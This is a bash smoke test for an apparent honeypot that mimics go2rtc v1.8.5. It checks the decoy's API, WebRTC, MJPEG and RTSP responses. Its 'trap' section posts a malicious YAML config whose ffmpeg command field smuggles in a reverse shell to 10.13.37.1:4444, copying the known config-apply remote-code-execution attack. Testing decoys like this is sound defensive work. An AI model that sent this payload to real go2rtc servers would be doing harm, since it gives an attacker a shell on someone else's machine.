#!/usr/bin/env bash
# 好甜的蜜罐 smoke test — verifies the decoy behaves like a real go2rtc
# v1.8.5 and that the trap catches the classic config-apply RCE.
#
#   ./smoke_test.sh [HOST] [HTTP_PORT] [RTSP_PORT]
#
# Exit code 0 = all pass. Run against a live instance, e.g.:
#   python3 honeypot.py --port 19840 --rtsp-port 85540 --data-dir /tmp/smoke &
#   ./smoke_test.sh 127.0.0.1 19840 85540

set -u
HOST="${1:-127.0.0.1}"
PORT="${2:-1984}"
RPORT="${3:-8554}"
B="http://$HOST:$PORT"
PASS=0
FAIL=0

ok()   { PASS=$((PASS+1)); echo "  ✓ $1"; }
bad()  { FAIL=$((FAIL+1)); echo "  ✗ $1"; }
check() { # name expected actual
  if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (expected [$2] got [$3])"; fi
}

echo "🍯 smoke test against $HOST:$PORT (RTSP $RPORT)"
echo

# --- fingerprint -----------------------------------------------------------
ORIG=/tmp/smoke_orig.yaml
curl -s $B/api/config > $ORIG
check "GET /api version is 1.8.5" "1.8.5" \
  "$(curl -s $B/api | python3 -c 'import json,sys;print(json.load(sys.stdin)["version"])')"
check "GET /api has rtsp listen" ":$RPORT" \
  "$(curl -s $B/api | python3 -c 'import json,sys;print(json.load(sys.stdin)["rtsp"]["listen"])')"
check "unknown path is Go mux 404" "404 page not found" \
  "$(curl -s $B/nope | tr -d '\n')"
check "GET / serves old white-table UI" "1" \
  "$(curl -s $B/ | grep -c '<tbody id="streams">')"
check "GET /api/streams leaks creds (v1.8.5 has no masking)" "1" \
  "$(curl -s $B/api/streams | grep -c 'rtsp://admin:DoorCam2024@')"

# --- the trap --------------------------------------------------------------
EVIL='streams:
  front_door: rtsp://admin:DoorCam2024@192.168.1.42:554/cam/realmonitor?channel=1&subtype=0
  smoke_pwn: ffmpeg:rtsp://127.0.0.1/test#video=copy#audio=copy#command=bash -i >& /dev/tcp/10.13.37.1/4444 0>&1
'
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST --data-binary "$EVIL" $B/api/config)
check "POST /api/config with malicious YAML -> 200 empty" "200" "$code"
printf '%s' "$EVIL" > /tmp/smoke_evil.yaml
curl -s $B/api/config > /tmp/smoke_echo.yaml
if cmp -s /tmp/smoke_evil.yaml /tmp/smoke_echo.yaml; then
  ok "GET /api/config echoes payload byte-for-byte (illusion holds)"
else
  bad "config echo mismatch"
fi
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST --data-binary "not yaml at all" $B/api/config)
check "invalid YAML -> 500 with yaml error" "500" "$code"
curl -s -o /dev/null -X POST $B/api/restart
check "restart makes planted stream visible" "1" \
  "$(curl -s $B/api/streams | grep -c smoke_pwn)"
# restore the original fake config so re-runs stay clean
curl -s -o /dev/null -X POST --data-binary @$ORIG $B/api/config
curl -s -o /dev/null -X POST $B/api/restart

# --- streams API -----------------------------------------------------------
check "PUT with spaces -> 400 (streams.New sanitize)" "400" \
  "$(curl -s -o /dev/null -w '%{http_code}' -X PUT "$B/api/streams?src=a%20b&name=x")"
check "PUT adds stream" "200" \
  "$(curl -s -o /dev/null -w '%{http_code}' -X PUT "$B/api/streams?src=rtsp://10.0.0.9/x&name=smoke1")"
check "PATCH without name -> 400" "400" \
  "$(curl -s -o /dev/null -w '%{http_code}' -X PATCH "$B/api/streams?src=rtsp://10.0.0.9/y")"
check "DELETE removes stream" "200" \
  "$(curl -s -o /dev/null -w '%{http_code}' -X DELETE "$B/api/streams?src=smoke1")"

# --- webrtc / media --------------------------------------------------------
OFFER='{"type":"offer","sdp":"v=0\r\no=- 1 2 IN IP4 127.0.0.1\r\n"}'
check "POST /api/webrtc json -> answer" "answer" \
  "$(curl -s -X POST -H 'Content-Type: application/json' --data-binary "$OFFER" "$B/api/webrtc?src=front_door" | python3 -c 'import json,sys;print(json.load(sys.stdin)["type"])')"
check "WHEP (application/sdp) -> 201" "201" \
  "$(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'Content-Type: application/sdp' --data-binary 'v=0' "$B/api/webrtc?src=front_door")"
check "frame.jpeg serves JPEG" "JPEG image data" \
  "$(curl -s "$B/api/frame.jpeg?src=front_door" | file - | cut -d: -f2 | grep -o 'JPEG image data' | head -1)"
check "frame.jpeg unknown -> 404 stream not found" "404" \
  "$(curl -s -o /dev/null -w '%{http_code}' "$B/api/frame.jpeg?src=nope")"
check "mjpeg content-type" "multipart/x-mixed-replace; boundary=frame" \
  "$(curl -s --max-time 1 -o /dev/null -D- "$B/api/stream.mjpeg?src=front_door" | grep -i '^content-type:' | sed 's/^[Cc]ontent-[Tt]ype: //' | tr -d '\r\n')"

# --- control endpoints -----------------------------------------------------
curl -s -o /dev/null -X POST "$B/api/exit?code=0"
check "server survives /api/exit illusion" "200" "$(curl -s -o /dev/null -w '%{http_code}' $B/api)"
check "bad exit code -> 400 message" "Code must be in the range [0, 125]" \
  "$(curl -s -X POST "$B/api/exit?code=999" | tr -d '\n')"
if [ "$(curl -s $B/api/log | wc -l | tr -d ' ')" -ge 5 ]; then
  ok "GET /api/log jsonlines (>=5)"
else
  bad "GET /api/log jsonlines (expected >=5, got fewer)"
fi
check "DELETE /api/log -> OK" "OK" "$(curl -s -X DELETE $B/api/log | tr -d '\n')"

# --- RTSP ------------------------------------------------------------------
python3 - "$HOST" "$RPORT" <<'EOF' && ok "RTSP OPTIONS + DESCRIBE + session flow" || bad "RTSP flow"
import socket, sys
host, port = sys.argv[1], int(sys.argv[2])
def rtsp(req, s=None, read=True):
    own = s is None
    if own:
        s = socket.create_connection((host, port), timeout=5)
    s.sendall(req.encode())
    data = s.recv(2048).decode("utf-8", "replace") if read else ""
    if own:
        s.close()
    return data
r = rtsp("OPTIONS rtsp://%s:%d RTSP/1.0\r\nCSeq: 1\r\n\r\n" % (host, port))
assert "200 OK" in r and "DESCRIBE" in r
r = rtsp("DESCRIBE rtsp://%s:%d/front_door RTSP/1.0\r\nCSeq: 2\r\n\r\n" % (host, port))
assert "200 OK" in r and "application/sdp" in r and "go2rtc/1.8.5" in r
s = socket.create_connection((host, port), timeout=5)
r = rtsp("SETUP rtsp://%s:%d/front_door/trackID=0 RTSP/1.0\r\nCSeq: 3\r\nTransport: RTP/AVP\r\n\r\n" % (host, port), s=s)
assert "Session:" in r
r = rtsp("PLAY rtsp://%s:%d/front_door RTSP/1.0\r\nCSeq: 4\r\n\r\n" % (host, port), s=s)
assert "200 OK" in r
s.close()
EOF

echo
echo "  passed: $PASS   failed: $FAIL"
[ "$FAIL" -eq 0 ] && echo "🍯 the pot is sweet and working" || exit 1
